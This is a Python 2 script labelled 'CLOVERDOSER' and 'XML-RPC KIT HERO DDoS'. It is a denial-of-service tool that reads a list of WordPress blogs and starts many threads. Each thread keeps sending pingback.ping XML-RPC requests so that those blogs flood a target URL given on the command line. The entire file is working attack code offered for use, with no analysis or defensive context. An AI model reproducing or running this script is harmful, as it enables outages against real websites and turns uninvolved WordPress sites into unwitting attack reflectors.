#CLOVERDOSER
#!/usr/bin/python
import sys
import socket
import threading
import time
import os
import re
Lock = threading.Lock()
def main():
		try:
			in_file = open("xml.txt","r")
		except:
			raw_input('You need a list.txt file to work')
			sys.exit(0)
		print '\tXML-RPC KIT HERO DDoS DGv1\n'
		url = sys.argv[1]
		num_thread = int(sys.argv[2])
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(num_thread):
			for t in range(100):
				try:
					in_line = in_file.readline()
					Thread1(url, i+1, in_line).start()
					in_line = in_line[:-1]
				except:
					pass
		time.sleep(3)

	
class Thread1(threading.Thread):
	def __init__(self, url, number, blog):
		self.url = url
		self.number = number
		self.blog = blog
		threading.Thread.__init__(self)
		
	def run(self):
		Lock.acquire()
		#print 'Starting thread #%s'%self.number
		Lock.release()
		function_pingback = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>"%(self.url, self.blog)
		request_lenght = len(function_pingback)
		try:
			self.blog_cleaned = self.blog.split("?p=")[0]
			self.blog_cleaned1 = self.blog_cleaned.split("http://")[1].split("/")[0]
		except:
			sys.exit(0)
		request = "POST %s/xmlrpc.php HTTP/1.0\r\nHost: %s\r\nUser-Agent: Internal Wordpress RPC connection\r\nContent-Type: text/xml\r\nContent-Length: %s\r\n\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>\r\n\r\n"%(self.blog_cleaned, self.blog_cleaned1, request_lenght, self.url, self.blog)
		while True:
				time.sleep(3)
				try:
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOL_TCP)
					s.connect((self.blog_cleaned1, 80))
					s.send(request)
					print self.blog_cleaned1+" connect " + self.url
				except:
					print 'Error'
					ok = 0
main()
